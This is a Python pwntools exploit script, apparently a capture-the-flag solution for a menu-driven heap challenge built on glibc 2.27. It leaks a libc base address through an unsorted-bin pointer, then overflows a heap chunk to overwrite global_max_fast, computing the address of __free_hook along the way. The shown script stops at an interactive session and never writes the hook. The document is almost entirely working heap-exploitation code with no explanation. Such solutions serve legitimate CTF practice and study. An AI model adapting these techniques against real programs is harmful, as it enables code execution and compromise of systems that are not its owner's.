from pwn import *

elf = ELF("./whv")

def malloc(slot,size):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("slot (0-9)?",str(slot))
    p.sendlineafter("size:",str(size))
    print(p.recv())
def write(slot,data):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("slot (0-9)?",str(slot))
    p.sendlineafter("data:",str(data))
    print(p.recv())
def prints(slot):
    p.sendlineafter("> ",str(3))
    p.sendlineafter("slot (0-9)?",str(slot))
    return p.recv()
def free(slot):
    p.sendlineafter("> ",str(4))
    p.sendlineafter("slot (0-9)?", str(slot))
    print(p.recv())
def secret(data):
    p.sendlineafter("> ",str(1337))
    p.sendlineafter("slot (0-9)?", str(1))
    p.sendlineafter("data 1:", str('aaaa'))
    p.sendlineafter("data 2:", str(data))
libc_offset =0x3ebc40 

#p = process(["/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/ld-2.27.so","./tcash"],env={'LD_PRELOAD': '/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so'})
#p = process("./whv")
libc = ELF("/home/hacker/tools/pwn/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc-2.27.so")
#p = remote('tcash-a57a558adff75b59.squarectf.com',7852)
p = remote('localhost',7852)
malloc(0,0)
malloc(1,0x6f8)
malloc(2,0)
free(1)
prints(0)
#leak libc
leak = p.recvuntil('malloc')
fd = u64(leak[1792:1800])
libc_base = fd-libc_offset-96
info('fd %s'%hex(fd))
info("libc base %s"%hex(libc_base))

global_max_fast_off = 0x3ed940
free_hook_off = libc.symbols['__free_hook']

global_max_fast = libc_base+global_max_fast_off
free_hook = libc_base + free_hook_off

main_arena = 0x3ebc40
#Global max fast overwrite
overwrite = 'a'*0x6f8+p64(0x701)+p64(0x1)+p64(global_max_fast-0x10)
write(0,overwrite)

malloc(1,0x6f8)



#gdb.attach(p,'''b*555555554d28''')
#libc_base = 0x7ffff7dc3000


p.interactive()
